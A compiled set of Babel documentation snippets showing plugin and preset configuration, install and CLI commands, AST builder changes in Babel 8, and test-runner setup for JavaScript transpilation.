DESCRIPTION: Demonstrates how to add the plugin to a Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-flow-strip-types"]
}

----------------------------------------

TITLE: Installing and Configuring Babel Preset for Stage 2 Proposals
DESCRIPTION: Commands to install the Stage 2 preset for Babel and the corresponding .babelrc configuration. Note that stage presets include all stages above them automatically.

LANGUAGE: Shell
CODE:
$ npm install --save-dev babel-preset-stage-2

LANGUAGE: JavaScript
CODE:
{
  "presets": ["stage-2"]
}

----------------------------------------

TITLE: Configuring Import Attributes Plugin in Babel Config
DESCRIPTION: JSON configuration to enable the import attributes plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-proposal-import-attributes-to-assertions"]
}

----------------------------------------

TITLE: Configuring Babel with Latest Preset
DESCRIPTION: Shows how to use the new 'latest' preset in Babel, which includes all transforms for ES2015+. It also demonstrates how to pass options to the ES2015 preset within the 'latest' configuration.

LANGUAGE: JavaScript
CODE:
// .babelrc
{ "presets": ["latest"] }
// with options
{ "presets": [
  ["latest", {
    "es2015": {
      "modules": false
    }
  }]
] }

----------------------------------------

TITLE: Using Import Assertions in Babel 7.12.0
DESCRIPTION: Parser support for the Import Assertions proposal.

LANGUAGE: JavaScript
CODE:
import json from "./foo.json" assert { type: "json" };

----------------------------------------

TITLE: Defining Custom Helpers in @babel/helpers
DESCRIPTION: Example of defining a custom helper in @babel/helpers, demonstrating the structure and guidelines for creating valid helper modules.

LANGUAGE: javascript
CODE:
helpers.customHelper = defineHelper(`
  import dep from "dependency";

  const foo = 2;

  export default function getFooTimesDepPlusX(x) {
    return foo * dep() + x;
  }
`);

----------------------------------------

TITLE: Installing @babel/plugin-transform-for-of via npm
DESCRIPTION: Shows the command to install the plugin using npm package manager.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-for-of

----------------------------------------

TITLE: Using @babel/preset-react via CLI
DESCRIPTION: Command to use @babel/preset-react preset with Babel CLI to transform a JavaScript file.

LANGUAGE: shell
CODE:
babel --presets @babel/preset-react script.js

----------------------------------------

TITLE: Configuring Babel for Arrow Functions in .babelrc
DESCRIPTION: Example .babelrc configuration to enable the arrow functions transform plugin in Babel.

LANGUAGE: JavaScript
CODE:
{
  "plugins": ["transform-es2015-arrow-functions"]
}

----------------------------------------

TITLE: Using Named Capturing Groups in Babel 7.3.0
DESCRIPTION: Support for named capturing groups in regular expressions.

LANGUAGE: JavaScript
CODE:
str.match({String.raw`/^(?<year>\d{4})-(?<month>\d{2})-(?<day>\d{2})$/`})

----------------------------------------

TITLE: Declaring Pure Function Type Definition
DESCRIPTION: Type declaration for the annotateAsPure function that accepts either a Node or NodePath parameter.

LANGUAGE: javascript
CODE:
declare export default annotateAsPure(nodeOrPath: Node | NodePath);

----------------------------------------

TITLE: Plugin Usage via CLI - Shell
DESCRIPTION: Command line usage of the plugin to transform JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-duplicate-keys script.js

----------------------------------------

TITLE: Plugin Usage via CLI - Shell
DESCRIPTION: Command line usage of the plugin to transform JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-duplicate-keys script.js

----------------------------------------

TITLE: Babel 5 Plugin API Example
DESCRIPTION: Illustrates the plugin API structure in Babel 5, which is now considered outdated. This example shows how plugins were defined in the previous version.

LANGUAGE: JavaScript
CODE:
export default function({ Plugin, types: t }) {
  return new Plugin('ast-transform', {
    visitor: { … }
  });
}

----------------------------------------

TITLE: Babel Config Function with Cache API
DESCRIPTION: Example of a Babel configuration function using the cache API to optimize performance in different environments.

LANGUAGE: javascript
CODE:
module.exports = function(api) {\n  api.cache.using(() => process.env.NODE_ENV);\n  return {};\n};

----------------------------------------

TITLE: Transforming Private Destructuring in JavaScript Classes
DESCRIPTION: Demonstrates how the plugin transforms private destructuring in a class method. It converts `var { #y: y } = this` to `var y = this.#y`.

LANGUAGE: JavaScript
CODE:
class Foo {
  x;
  #y;
  equalsTo({ x, #y: y }) {
    return this.x === x && this.#y === y;
  }
}

LANGUAGE: JavaScript
CODE:
class Foo {
  x;
  #y;
  equalsTo(_p) {
    var { x } = _p, y = _p.#y;
    return this.x === x && this.#y === y;
  }
}

----------------------------------------

TITLE: Babel Configuration Example
DESCRIPTION: JSON configuration for using the plugin with Babel

LANGUAGE: json
CODE:
{
  "plugins": [
    "@babel/plugin-transform-dynamic-import",
    "@babel/plugin-transform-modules-commonjs"
  ]
}

----------------------------------------

TITLE: Using highlight Function
DESCRIPTION: Demonstrates how to use the highlight function to add syntax highlighting to code snippets for terminal display.

LANGUAGE: javascript
CODE:
import { highlight } from "@babel/code-frame";

const code = `class Foo {
  constructor()
}`;

const result = highlight(code);

console.log(result);

----------------------------------------

TITLE: Method Extraction with Function Bind Syntax in JavaScript
DESCRIPTION: Illustrates method extraction using the :: operator for handling promise resolution and DOM event handling.

LANGUAGE: JavaScript
CODE:
/* ES7 */
Promise.resolve(123).then(::console.log);

LANGUAGE: JavaScript
CODE:
/* ES6 */
// Which could be written in ES6 as:
Promise.resolve(123).then(console.log.bind(console));

LANGUAGE: JavaScript
CODE:
/* ES7 */
$(".some-link").on("click", ::view.reset);

LANGUAGE: JavaScript
CODE:
/* ES6 */
$(".some-link").on("click", view.reset.bind(view));

----------------------------------------

TITLE: Creating an AssignmentPattern Node
DESCRIPTION: Example of creating an AssignmentPattern node using the t.assignmentPattern(left, right) builder function.

LANGUAGE: JavaScript
CODE:
t.assignmentPattern(left, right);

----------------------------------------

TITLE: CommonJS Transform Output
DESCRIPTION: Example of how dynamic import is transformed for CommonJS module format

LANGUAGE: javascript
CODE:
Promise.resolve()
  .then(() => _interopRequireWildcard(require("jquery")))
  .then(($) => {});

----------------------------------------

TITLE: Mocha 3 Configuration with Polyfill
DESCRIPTION: Package.json script configuration for Mocha 3 including babel-polyfill and compiler settings

LANGUAGE: json
CODE:
{
  "scripts": {
    "test": "mocha --require babel-polyfill --compilers js:@babel/register"
  }
}

----------------------------------------

TITLE: Cloning and Setting Up Babel Website Repository
DESCRIPTION: Commands to clone the Babel website repository and install dependencies using Yarn. Requires Node.js version 20.5.0 or higher and Yarn 1 version 1.19.0 or higher.

LANGUAGE: shell
CODE:
$ git clone git@github.com:babel/website.git
$ yarn && yarn bootstrap

----------------------------------------

TITLE: Demonstrating Decorator Usage in JavaScript
DESCRIPTION: This code snippet showcases the syntax for using decorators in JavaScript, including class and method decorators. It illustrates how decorators can be used to modify class and method behavior concisely.

LANGUAGE: JavaScript
CODE:
@frozen class Foo {
  @configurable(false)
  @enumerable(true)
  method() {}

  @throttle(500)
  expensiveMethod() {}
}

----------------------------------------

TITLE: Configuring Babel for Optional Chaining Assignment
DESCRIPTION: This JSON configuration snippet shows how to set up Babel to use the Optional Chaining Assignment plugin with a specific version.

LANGUAGE: json
CODE:
{
  "plugins": [
    ["@babel/plugin-proposal-optional-chaining-assign", {
      "version": "2023-07"
    }]
  ]
}

----------------------------------------

TITLE: Configuring Mocha with Polyfills
DESCRIPTION: Enhanced .mocharc.yaml configuration that includes both core-js polyfills and Babel register

LANGUAGE: yaml
CODE:
require:
  - 'core-js'
  - '@babel/register'

----------------------------------------

TITLE: Setting up Babel Configuration
DESCRIPTION: Basic Babel configuration file that enables @babel/preset-env for transpiling modern JavaScript features.

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-env"]
}

----------------------------------------

TITLE: Updating TSTypeParameter Builder in Babel 8
DESCRIPTION: The signature of the t.tsTypeParameter builder has changed in Babel 8. It now requires an Identifier node as the third argument.

LANGUAGE: javascript
CODE:
t.tsTypeParameter(
  /* constraint */ undefined,
  /* default */ undefined,
+   t.identifier(
    name
+   )
)

----------------------------------------

TITLE: Updating TSImportType AST in Babel 8
DESCRIPTION: The AST structure for TypeScript import types has changed in Babel 8. The argument is now wrapped in a TSLiteralType node.

LANGUAGE: typescript
CODE:
var arr: import("./Array")

// AST in Babel 7
{
  type: "TSImportType",
  argument: StringLiteral("./Array")
}

// AST in Babel 8
{
  type: "TSImportType",
  argument: {
    type: "TSLiteralType",
    literal: StringLiteral("./Array")
  }
}

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install babel-plugin-transform-simplify-comparison-operators --save-dev

----------------------------------------

TITLE: Unsupported Object.assign Patterns
DESCRIPTION: Shows code patterns that are not supported by the plugin. These include destructuring Object.assign or assigning it to a variable.

LANGUAGE: JavaScript
CODE:
var { assign } = Object;
var assign = Object.assign;

----------------------------------------

TITLE: Implementing babel-preset-stage-0 in Babel v6
DESCRIPTION: The original source code of babel-preset-stage-0, showing how it included Stage 1 preset and additional plugins for Stage 0 proposals.

LANGUAGE: JavaScript
CODE:
module.exports = {
  presets: [
    require("babel-preset-stage-1")
  ],
  plugins: [
    require("babel-plugin-transform-do-expressions"),
    require("babel-plugin-transform-function-bind")
  ]
};

----------------------------------------

TITLE: Installing babel-helper-flip-expressions via Package Manager
DESCRIPTION: Command to install babel-helper-flip-expressions as a development dependency using npm or yarn package managers.

LANGUAGE: shell
CODE:
npm install babel-helper-flip-expressions --save-dev